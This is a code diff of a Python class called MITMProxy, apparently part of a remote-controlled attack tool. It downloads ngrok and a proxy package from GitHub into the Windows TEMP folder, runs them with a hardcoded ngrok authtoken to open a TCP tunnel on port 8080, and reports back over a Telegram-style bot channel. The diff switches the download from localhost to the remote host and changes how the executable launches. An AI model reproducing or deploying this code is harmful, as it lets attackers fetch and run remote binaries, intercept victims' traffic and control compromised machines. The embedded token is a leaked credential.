@@ -10,7 +10,7 @@ class MITMProxy():
 	def __init__(self):
 		self.token = sys.argv[1]
 		self.chat_id= sys.argv[2]
-		self.ngrok = "http://127.0.0.1/ngrok-stable-windows-386.zip"#https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/ngrok-stable-windows-386.zip"
+		self.ngrok = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/ngrok-stable-windows-386.zip"
 		self.mitmfproxy = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/mitmfproxy.zip"
 		self.Main()
 
@@ -31,7 +31,7 @@ class MITMProxy():
 		with ZipFile(filename, 'r') as zip_ref:
 			zip_ref.extractall(os.environ['TEMP'])
 		Popen([os.environ['TEMP'] + "\\ngrok.exe","authtoken","27D5cTLjSznClCfArRRGjs2os83_6Ps5YmFqGTfUVZgvnR7e1"])
-		Popen([os.environ['TEMP'] + "\\ngrok.exe","tcp","8080"])
+		shell.ShellExecuteEx(lpFile=os.environ['TEMP'] + "\\ngrok.exe", lpParameters="tcp 8080")
 		self.SendMessage(" Ngrok Executed.")
 
 	def MITM_Proxy(self):
